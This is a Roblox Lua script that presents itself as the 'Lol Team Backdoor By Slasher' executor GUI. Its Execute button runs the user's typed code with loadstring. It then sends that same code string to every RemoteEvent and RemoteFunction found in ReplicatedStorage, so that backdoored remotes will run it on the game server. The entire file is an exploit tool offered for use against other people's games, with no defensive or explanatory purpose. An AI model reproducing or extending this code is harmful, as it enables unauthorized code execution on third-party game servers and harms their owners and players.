local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

-- Notification
local function sendNotification(title, message, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = message,
            Duration = duration or 5
        })
    end)
end

-- Scan for backdoors
local function scanForBackdoors()
    local backdoors = {}
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(backdoors, obj)
        end
    end
    return backdoors
end

-- Create GUI
local function loadMainGui()
    sendNotification("Lol Team Backdoor", "Loaded Successfully By Slasher", 6)

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LolTeamBackdoor"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = PlayerGui

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 450, 0, 300)
    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
    MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui

    -- Neon Purple Border
    local Border = Instance.new("Frame")
    Border.Size = UDim2.new(1, 6, 1, 6)
    Border.Position = UDim2.new(0, -3, 0, -3)
    Border.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    Border.BorderSizePixel = 0
    Border.ZIndex = 0
    Border.Parent = MainFrame

    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 255))
    }
    Gradient.Rotation = 90
    Gradient.Parent = Border

    -- Title
    local TitleFrame = Instance.new("Frame")
    TitleFrame.Size = UDim2.new(1, 0, 0, 40)
    TitleFrame.BackgroundTransparency = 1
    TitleFrame.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0, 400, 1, 0)
    Title.Position = UDim2.new(0, 15, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "Lol Team Backdoor By Slasher"
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 20
    Title.TextColor3 = Color3.fromRGB(220, 180, 255)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = TitleFrame

    -- Script Box
    local CodeBox = Instance.new("TextBox")
    CodeBox.Size = UDim2.new(0.92, 0, 0, 180)
    CodeBox.Position = UDim2.new(0.04, 0, 0, 50)
    CodeBox.BackgroundColor3 = Color3.fromRGB(8, 8, 16)
    CodeBox.BorderColor3 = Color3.fromRGB(140, 0, 255)
    CodeBox.BorderSizePixel = 2
    CodeBox.TextColor3 = Color3.fromRGB(180, 120, 255)
    CodeBox.PlaceholderText = "-- Lol Team Backdoor Ready --"
    CodeBox.Text = ""
    CodeBox.Font = Enum.Font.Code
    CodeBox.TextSize = 14
    CodeBox.ClearTextOnFocus = false
    CodeBox.MultiLine = true
    CodeBox.TextWrapped = true
    CodeBox.TextXAlignment = Enum.TextXAlignment.Left
    CodeBox.TextYAlignment = Enum.TextYAlignment.Top
    CodeBox.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = CodeBox

    -- Button Style
    local function styleButton(btn)
        btn.BackgroundColor3 = Color3.fromRGB(25, 15, 50)
        btn.BorderSizePixel = 0
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 15
        btn.TextColor3 = Color3.fromRGB(200, 160, 255)
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        local btnGradient = Instance.new("UIGradient")
        btnGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 0, 200)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 0, 120))
        }
        btnGradient.Parent = btn
    end

    -- Buttons
    local buttons = {
        {Name = "Execute", Pos = 1},
        {Name = "Clear", Pos = 2},
        {Name = "Reset", Pos = 3},
        {Name = "Inject", Pos = 4}
    }

    local btnWidth = 95
    local spacing = 10
    local totalWidth = 4 * btnWidth + 3 * spacing
    local startX = (450 - totalWidth) / 2

    for i, btnInfo in ipairs(buttons) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, btnWidth, 0, 35)
        btn.Position = UDim2.new(0, startX + (i-1)*(btnWidth + spacing), 0, 245)
        btn.Text = btnInfo.Name
        btn.Parent = MainFrame
        styleButton(btn)

        if btnInfo.Name == "Execute" then
            btn.MouseButton1Click:Connect(function()
                local code = CodeBox.Text
                local func, err = loadstring(code)
                if func then
                    pcall(func)
                end
                local backdoors = scanForBackdoors()
                for _, bd in pairs(backdoors) do
                    pcall(function()
                        if bd:IsA("RemoteEvent") then
                            bd:FireServer(code)
                        elseif bd:IsA("RemoteFunction") then
                            bd:InvokeServer(code)
                        end
                    end)
                end
            end)
        elseif btnInfo.Name == "Clear" then
            btn.MouseButton1Click:Connect(function()
                CodeBox.Text = ""
            end)
        elseif btnInfo.Name == "Reset" then
            btn.MouseButton1Click:Connect(function()
                if LocalPlayer.Character then
                    LocalPlayer.Character:BreakJoints()
                end
            end)
        elseif btnInfo.Name == "Inject" then
            btn.MouseButton1Click:Connect(function()
                local backdoors = scanForBackdoors()
                if #backdoors > 0 then
                    btn.Text = "Injected"
                end
            end)
        end
    end
end

loadMainGui()

